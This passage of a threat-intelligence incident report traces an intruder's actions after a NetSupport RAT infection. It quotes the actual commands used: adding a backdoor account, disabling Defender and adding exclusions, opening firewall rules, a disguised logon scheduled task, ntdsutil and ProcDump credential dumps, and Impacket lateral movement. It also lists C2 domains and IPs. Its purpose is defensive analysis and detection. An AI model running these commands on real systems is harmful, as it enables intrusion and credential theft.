<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22611" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-019.png" alt width="1121" height="55" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-019.png 1121w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-019-300x15.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-019-1024x50.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-019-768x38.png 768w" sizes="(max-width: 1121px) 100vw, 1121px" /></a></p>
<pre>@%COMSPEC% /C "net user localend Decryptme7 /add"</pre>
<p>We can also see the command that was used to attempt to add the user to the administrators group.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22612" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-020.png" alt width="1155" height="57" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-020.png 1155w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-020-300x15.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-020-1024x51.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-020-768x38.png 768w" sizes="(max-width: 1155px) 100vw, 1155px" /></a></p>
<p>We did not observe any backdoor account created after execution. When we performed our own testing, we saw the tools failed to work and would return an error rather than create an account.</p>
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<p>During this intrusion, the threat actor was primarily concerned with evading detection by Microsoft Defender. This can be seen multiple times throughout the intrusion where the threat actor checked the historical alerts from Defender using <code>powershell <a href="https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreat?view=windowsserver2022-ps">Get-MpThreat</a></code> after conducting credential harvesting or lateral movement actions.</p>
<p>During the intrusion, we observed multiple attempts to add exclusions and ultimately trying to disable the local Defender using below commands. The threat actor made several typos during the command execution, indicating a hands-on approach rather than a scripted one. </p>
<pre>powershell  Get-MpThreat
powershell  Get-MpPreference
powershell  Add-MpPreference -ExclustionPath c:\users\public
powershell  Add-MpPreference -ExclusionPath c:\users\public
powershell  Add-MpPreference -ExclusionProcess c:\users\public\mpms.exe
powershell  Add-MpPreference -DisableBehaviourMonitoring True
powershell  Add-MpPreference -DisableBehaviorMonitoring True
powershell  Add-MpPreference -DisDisableRealtimeMonitoring True
</pre>
<p>The mpms executable from the above commands was a renamed <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noreferrer noopener">ProcDump</a> binary. It was likely renamed in an attempt to avoid detection.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22613" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-021.png" alt width="508" height="456" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-021.png 508w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-021-300x269.png 300w" sizes="(max-width: 508px) 100vw, 508px" /></a></p>
<p>After some activity, the threat actor entered the &#8216;Scans&#8217; directory of Microsoft&#8217;s Defender software, located under:</p>
<pre>C:\ProgramData\Microsoft\Windows Defender\Scans\History\</pre>
<p>In addition to checking the Windows Defender historical scan files, the threat actor once again used the <code>Get-MpThreat</code> Cmdlet to query the history of threats detected by Windows Defender.</p>
<p>During the intrusion, the threat actor relied heavily on the toolkit <strong>Impacket </strong>(especially <em><a href="https://github.com/fortra/impacket/blob/master/examples/atexec.py" target="_blank" rel="noreferrer noopener">atexec.py</a></em><em> and <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer noopener">wmiexec</a>). </em>To facilitate some of its capabilities, the host-based firewall was modified before the actual execution of <a href="http://atexec.py" target="_blank" rel="noreferrer noopener">atexec.py</a> and wmiexec executions:</p>
<pre>cmd.exe /C netsh advfirewall firewall add rule dir=in name="DCOM" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 &gt; C:\Windows\Temp\VlPWyecW.tmp 2&gt;&amp;1
cmd.exe /C netsh advfirewall firewall add rule dir=in name="DCOM" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 &gt; C:\Windows\Temp\pOrnerOW.tmp 2&gt;&amp;1
cmd.exe /C netsh advfirewall firewall add rule dir=in name ="WMI" program=C:\Windows\system32\svchost.exe service=winmgmt action = allow protocol=TCP localport=any &gt; C:\Windows\Temp\XsssmLZZ.tmp 2&gt;&amp;1
cmd.exe /C netsh advfirewall firewall add rule dir=in name ="UnsecApp" program=C:\Windows\system32\wbem\unsecapp.exe action=allow &gt; C:\Windows\Temp\HaALurWi.tmp 2&gt;&amp;1
cmd.exe /C netsh advfirewall firewall add rule dir=out name ="WMI_OUT" program=C:\Windows\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any &gt; C:\Windows\Temp\WkiMfXXo.tmp 2&gt;&amp;1
</pre>
<p>Multiple times during the intrusion, the threat actor made use of cabinet files (.cab). These are archive files, which support lossless data compression. They are mainly used to distribute device drivers and system files. However, in this case, the actor used its functionality similarly to a traditional .zip archive and deployed its contents under the <em>programdata </em>directory.</p>
<pre>cmd.exe /Q /c expand cache.cab -F:* c:\programdata</pre>
<p>After decompression, we found a <strong>NetSupport</strong> executable disguised as a Windows component. The executable file was named <code>mswow86.exe</code>. The threat actor created a scheduled task to run the binary on every logon.</p>
<pre>cmd.exe /Q /c start "" %%programdata%%\schcache\mswow86.exe
cmd.exe /Q /c schtasks.exe /create /sc onlogon /tn "Wow64 Subsystem" /rl highest /tr "%%programdata%%\schcache\mswow86.exe
</pre>
<p>All the chosen names appear to represent a &#8216;legitimate&#8217; Windows component:</p>
<ul class="wp-block-list">
<li>The name for the executable (<code>mswow86.exe</code>)</li>
<li>The storage location of this executable (<code><em>%programdata%\schache\</em></code>)</li>
<li>The scheduled task name (<code><em>Wow64 Subsystem</em></code>)</li>
</ul>
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<p>We observed the threat actor dumping the <strong>ntds.dit</strong> database on two different domain controllers using a batch script, which then executed the command described in <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration" target="_blank" rel="noreferrer noopener">here</a>:</p>
<pre>powershell.exe  "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\users\public\ntds' q q"
powershell.exe  "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\ProgramData\ntdsutil' q q" 
</pre>
<p>As seen in the Defense Evasion section, the actor used the <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noreferrer noopener">Sysinternals tool ProcDump</a>. The threat actor executed a command to identify the PID of the lsass.exe process. This allowed them to target the correct process to dump lsass:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22614" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-022.png" alt width="277" height="121" /></a></p>
<p>It appears this will not work, as there is no directory for the <em>find </em>command, but the actor likely piped it together, as we saw execution of <strong>tasklist</strong> at the same time:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22615" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-023.png" alt width="281" height="105" /></a></p>
<p>This is likely the result of executing something like the following (<code>tasklist | find /i "lsas"</code> ):</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22616" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-024.png" alt width="620" height="50" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-024.png 620w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-024-300x24.png 300w" sizes="(max-width: 620px) 100vw, 620px" /></a></p>
<p>Using the renamed ProcDump utility, the threat actor dumps the <strong>lsass.exe</strong> process, which can be used to get more credential information:</p>
<pre>mpms.exe  -accepteula -ma 632
mpms.exe  -accepteula -ma 716
</pre>
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<p>The attackers executed several familiar discovery commands on the targeted systems. These were related to the discovery of information on users, hosts and the network configuration. The threat actor connected via the NetSupport agent and then started running commands via a spawned instance of <strong>cmd.exe</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22617" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-025.png" alt width="1109" height="263" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-025.png 1109w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-025-300x71.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-025-1024x243.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-025-768x182.png 768w" sizes="(max-width: 1109px) 100vw, 1109px" /></a></p>
<p>Below are the first batch of executed discovery commands observed. As seen during this entire intrusion, the threat actor makes small mistakes, either with typos or in command functionality:</p>
<pre>whoami
net user
net user /domain
whoami /all
net user &lt;PRIV_ACCOUNT&gt;
net group "Domain Admins" /domain
systeminfo
cmdkey /list
</pre>
<p>We observed the threat actor quickly query for a specific account. This account is a local admin and a domain admin. However, this account was not activated and the actor tried to enable it, making a few mistakes along the way:</p>
<pre>nltest /dclist:&lt;REDACTED&gt;
cmdkey /add:&lt;DC_NAME&gt; /user:&lt;DOMAIN&gt;\&lt;PRIV_ACC&gt; /pass:REDACTED 
net user &lt;PRIV_ACC&gt; /domain
whoami
net user &lt;USER_ACCOUNT&gt; /domain
cmdkey /del:&lt;DC_NAME&gt;
cmdkey /add:"&lt;DC_NAME&gt;" /user:&lt;DC_NAME&gt;\&lt;PRIV_ACC&gt; /pass:REDACTED
cmdkey /del:"&lt;DC_NAME&gt;"
net user &lt;PRIV_ACCOUNT&gt;
cmdkey /add:"&lt;DC_NAME&gt;" /user:&lt;DC_NAME&gt;\&lt;PRIV_ACC&gt; /pass:REDACTED 
net user /add:"&lt;BEACHHOST&gt;" /user:&lt;DOMAIN_NAME&gt;&lt;PRIV_ACC&gt;/pass:REDACTED
cmdkey /list
cmdkey /del:"&lt;DC_NAME&gt;"
cmdkey /del:"&lt;BEACHHOST&gt;" 
</pre>
<p>We observe a couple of mistakes, as a result of hands-on activity and struggling to get things working:</p>
<ul class="wp-block-list">
<li>The first <em>cmdkey </em>is actually correct usage, however the account was not activated.</li>
<li>Using <em>/add </em>requires the usage of domain credentials, not credentials of machine.</li>
<li>Adding quotes to a command, where it does not matter.</li>
</ul>
<p>After this endeavor, the threat actor tried elsewhere, looking around for interesting information related to the <strong>SYSVOL</strong> shares. Additionally, the actor looked for the presence of <strong>SSH</strong>. This was not installed on the system, so the threat actor installed their own SSH server, as can be seen under the PERSISTENCE section. Additionally, the threat actor tried his luck to find additional domain controllers:</p>
<pre>net view \\&lt;DOMAIN_NAME&gt;.local
net view \\&lt;DOMAIN_NAME&gt;.local\sysvol
net view \\&lt;DOMAIN_NAME&gt;.local\SYSVOL
whoami /all
tasklist
find /i "ssh" 
ping -n 1 &lt;DOMAIN_NAME&gt;.local
ping -n 1 &lt;DC1&gt;.&lt;DOMAIN_NAME&gt;.local
ping -n 1 &lt;DC2&gt;.&lt;DOMAIN_NAME&gt;.local
ping -n 1 &lt;DC3&gt;.&lt;DOMAIN_NAME&gt;.local
arp -a
ping -n 1 REDACTED
ping -n 1 -a REDACTED
ping -n 1 -a REDACTED
ping -n 1 -a REDACTED
net view REDACTED
</pre>
<p>In addition to the recognizable <a href="http://atexec.py" target="_blank" rel="noreferrer noopener">atexec.py</a> characteristics, this <a href="https://u0041.co/blog/post/1" target="_blank" rel="noreferrer noopener">excellent read</a> explains how to hunt for <a href="http://atexec.py" target="_blank" rel="noreferrer noopener">atexec.py</a> in the Windows event logs:</p>
<pre>cmd.exe /C net group /domain &gt; C:\Windows\Temp\aWatKmSa.tmp 2&gt;&amp;1</pre>
<p>Resulted in:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22618" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-026.png" alt width="729" height="128" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-026.png 729w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-026-300x53.png 300w" sizes="(max-width: 729px) 100vw, 729px" /></a></p>
<p>and three seconds later in:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22619" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-027.png" alt width="457" height="117" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-027.png 457w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-027-300x77.png 300w" sizes="(max-width: 457px) 100vw, 457px" /></a></p>
<p>After this, wmiexec is observed:</p>
<pre>cmd.exe /Q /c cmdkey /list 1&gt; \\127.0.0.1\ADMIN$\__REDACTED 2&gt;&amp;1
cmd.exe /Q /c dor 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c whoami 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c whoami 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c cd programdata 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c ls 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c expand cache.cab -F:* c:\programdata 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
cmd.exe /Q /c whoami /all 1&gt; \\127.0.0.1\ADMIN$\____REDACTED  2&gt;&amp;1
</pre>
<p>After the <em>Impacket</em> activity, the threat actor returned later to a domain controller and a backup server, where additional tooling was used for discovery. The first was <a href="https://www.pingcastle.com/" target="_blank" rel="noreferrer noopener">PingCastle</a>, an active directory auditing tool. On the domain controller, the threat actor executed the following commands:</p>
<pre>whoami
net  group "Domain Admins"
quser
C:\ProgramData\start.bat 
➝ starting "pingcastle.exe --healthcheck --level Full"
C:\ProgramData\ntds.bat 
  ➝ script to dump the ntds
</pre>
<p>The second one was the <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">SoftPerfect Network Scanner</a>. This utility is commonly used by threat actors. While a paid utility, many use the free trial version. However, during this intrusion, the actor clearly did not pay for its version, as they brought their own keygen. On the backup server, the threat actor executed the following commands:</p>
<pre> "C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\Public\netscan_portable\" -spe -an -ai#7zMap24244:76:7zEvent17814

C:\Users\Public\netscan_portable\64-bit\SoftPerfect_&lt;REDACTED&gt;Patch_Keygen_v2&lt;REDACTED&gt;.exe" 
"C:\Users\Public\netscan_portable\64-bit\netscan.exe"
</pre>
<p>During the later stage of the intrusion, the threat actor dumped the event 4624 logs from a domain controller. These were written to the file mf.txt. This file was later added to a zip archive. The file was not looked at on the host it was dumped on. The dumping of these logs may have been to review user logon activity across the environment. </p>
<pre>powershell  -w hidden -C "Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' -MaxEvents 1 | sort-object timeCreated | select-object -ExpandProperty message"
powershell  -w hidden -C "Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' | sort-object timeCreated | select-object -ExpandProperty message"
</pre>
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<p>The threat actor heavily used the reverse SSH tunnel discussed within the Command and Control section to assist in lateral movement. Through this tunnel, the threat actor was able to proxy their access from the beachhead to other assets in the network using a handful of different techniques, including WMI, and RDP.</p>
<p>As mentioned in the discovery section, Impacket&#8217;s atexec module was utilized within the SSH tunnel to proxy traffic to a domain controller to assist with lateral movement. In between executions of atexec, we see Windows Security event logs that match behavior of lateral movement:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22620" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-028.png" alt width="953" height="142" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-028.png 953w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-028-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-028-768x114.png 768w" sizes="(max-width: 953px) 100vw, 953px" /></a></p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22621" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-029.png" alt width="1978" height="454" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-029.png 1978w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-029-300x69.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-029-1024x235.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-029-768x176.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-029-1536x353.png 1536w" sizes="(max-width: 1978px) 100vw, 1978px" /></a></figure>
<h3 class="wp-block-heading">SMB</h3>
<p>During the intrusion, the threat actor used SMB to copy files over to other systems. Here, the files were not sent over the network in the clear, preventing network inspection, but we were able to inspect the file creation and deletion via event ID 5145 for File Share Auditing event. In the logs, we can see the AccessMask of 0x2 during the file write followed by 0x10080 during the file delete action.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22622" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-030.png" alt width="1819" height="810" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-030.png 1819w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-030-300x134.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-030-1024x456.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-030-768x342.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-030-1536x684.png 1536w" sizes="(max-width: 1819px) 100vw, 1819px" /></a></p>
<h3 class="wp-block-heading">WMI</h3>
<p>Impacket&#8217;s wmiexec tool was used to pivot across the environment, extract the archived file <code>cache.cab</code>, and execute scheduled tasks to run NetSupport RAT on remote systems.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22623" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-031.png" alt width="1642" height="218" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-031.png 1642w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-031-300x40.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-031-1024x136.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-031-768x102.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-031-1536x204.png 1536w" sizes="(max-width: 1642px) 100vw, 1642px" /></a></p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22624" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-032.png" alt width="1721" height="437" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-032.png 1721w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-032-300x76.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-032-1024x260.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-032-768x195.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-032-1536x390.png 1536w" sizes="(max-width: 1721px) 100vw, 1721px" /></a></p>
<p>For a breakdown of the process command line arguments, refer to this previous <a href="https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/#lateral-movement" target="_blank" rel="noreferrer noopener">report</a>.</p>
<h3 class="wp-block-heading">RDP</h3>
<p>Remote Desktop Protocol (RDP) was used from the beachhead to two servers and two domain controllers on the network. We can verify this activity with Windows Event ID 4624 with logon type 10. This log triggers whenever a user successfully logs on to a computer or server via remote interactive logon (RDP or other remote desktop services).</p>
<p>Below illustrates the threat actor initiating RDP sessions from the beachhead to various servers within the network on day eight of this intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22686" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1.png" alt width="1593" height="235" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1.png 1593w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1-300x44.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1-1024x151.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1-768x113.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-033-1-1536x227.png 1536w" sizes="(max-width: 1593px) 100vw, 1593px" /></a></p>
<p>&nbsp;</p>
<p>Below, illustrates the full network architecture and lateral movement seen within this incident.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22626" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-034.png" alt width="1597" height="678" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-034.png 1597w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-034-300x127.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-034-1024x435.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-034-768x326.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-034-1536x652.png 1536w" sizes="(max-width: 1597px) 100vw, 1597px" /></a></p>
<p>During the intrusion, the threat actor revealed two different host names leaked in various Windows Event logs during their RDP sessions.</p>
<pre>DESKTOP-TBDQ6K1
WIN-5ODCFIGQRP3
</pre>
<p>Example Windows event ID 4776:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22627" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-035.png" alt width="523" height="117" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-035.png 523w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-035-300x67.png 300w" sizes="(max-width: 523px) 100vw, 523px" /></a></p>
<p>Example Windows event ID 4624:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22628" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-036.png" alt width="610" height="745" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-036.png 610w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-036-246x300.png 246w" sizes="(max-width: 610px) 100vw, 610px" /></a></p>
<p>Example Windows event ID 4779:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22629" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-037.png" alt width="719" height="318" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-037.png 719w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-037-300x133.png 300w" sizes="(max-width: 719px) 100vw, 719px" /></a></p>
<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>
<p>The threat actor was observed connecting to a file server from the Domain Controller and browsing multiple secretive documents on the system.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22630" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-038.png" alt width="3401" height="414" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-038.png 3401w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-038-300x37.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-038-1024x125.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-038-768x93.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-038-1536x187.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-038-2048x249.png 2048w" sizes="(max-width: 3401px) 100vw, 3401px" /></a></p>
<p>Additionally, we see the threat actor using 7-zip to collect the previously dumped ntds and a text file called mf.txt.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22631" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-039.png" alt width="1247" height="157" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-039.png 1247w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-039-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-039-1024x129.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-039-768x97.png 768w" sizes="(max-width: 1247px) 100vw, 1247px" /></a></p>
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<h3 class="wp-block-heading">NetSupport</h3>
<p>As referenced in the Initial Access section, the NetSupport deployment script writes a <code>client32.ini</code> file to the AppData Roaming path, which specifies the primary and secondary gateway.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22632" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-040.png" alt width="413" height="218" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-040.png 413w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-040-300x158.png 300w" sizes="(max-width: 413px) 100vw, 413px" /></a></p>
<p>The primary gateway, <code>npinmclaugh11[.]com:2145</code>, was unsuccessful as it resolved to an IP of <code>127.0.0.127</code>. As a result, all communication was thus routed through the secondary gateway at <code>npinmclaugh14[.]com:2145</code>. </p>
<pre>Dns query:
RuleName: -
UtcTime: &lt;DAY 1&gt; 03:34:16.236
ProcessGuid: {a9d5a793-0bb7-63ca-9404-000000000300}
ProcessId: 7648
QueryName: Npinmclaugh11.com
QueryStatus: 0
QueryResults: 127.0.0.127;
Image: C:\Users\&lt;REDACTED&gt;\AppData\Roaming\eHNjqgzZ\presentationhost.exe
User: &lt;REDACTED&gt;</pre>
<pre>Dns query:
RuleName: -
UtcTime: &lt;DAY 1&gt; 03:34:18.828
ProcessGuid: {a9d5a793-0bb7-63ca-9404-000000000300}
ProcessId: 7648
QueryName: Npinmclaugh14.com
QueryStatus: 0
QueryResults: 89.185.85.44;
Image: C:\Users\&lt;REDACTED&gt;\AppData\Roaming\eHNjqgzZ\presentationhost.exe
User: &lt;REDACTED&gt;
</pre>
<p>NetSupport connections were established on day one to 89.185.85.44 on port 2145; however, on day five of the intrusion, another NetSupport <code>client32.ini</code> file was deployed to other assets on the network, introducing a new command and control server of <code>wsus-isv-local[.]tech:133</code> and <code>wsus-isv-internal[.]tech:133</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22633" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-041.png" alt width="414" height="218" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-041.png 414w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-041-300x158.png 300w" sizes="(max-width: 414px) 100vw, 414px" /></a></p>
<pre>Dns query:
RuleName: -
UtcTime: &lt;DAY 4&gt; 22:26:27.990
ProcessGuid: {1dc91c81-5b19-63d0-0806-000000000600}
ProcessId: 4852
QueryName: wsus-isv-local.tech
QueryStatus: 0
QueryResults: 79.137.206.37;
Image: C:\ProgramData\schcache\mswow86.exe
User: &lt;REDACTED&gt;\Administrator
</pre>
<p>The following table provides a summary of all the domains and IPs used by NetSupport during this incident :</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>NetSupport C2 Domain</strong></td>
<td><strong>DNS Resolve Status</strong></td>
<td><strong>Resolved IP</strong></td>
</tr>
<tr>
<td>npinmclaugh11[.]com</td>
<td>NOERROR</td>
<td>127.0.0.127</td>
</tr>
<tr>
<td>npinmclaugh14[.]com</td>
<td>NOERROR</td>
<td>89.185.85.44</td>
</tr>
<tr>
<td>wsus-isv-local[.]tech</td>
<td>NOERROR</td>
<td>79.137.206.37</td>
</tr>
<tr>
<td>wsus-isv-internal[.]tech</td>
<td>NXDOMAIN</td>
<td>N/A</td>
</tr>
</tbody>
</table>
</figure>
<figure class="wp-block-image"></figure>
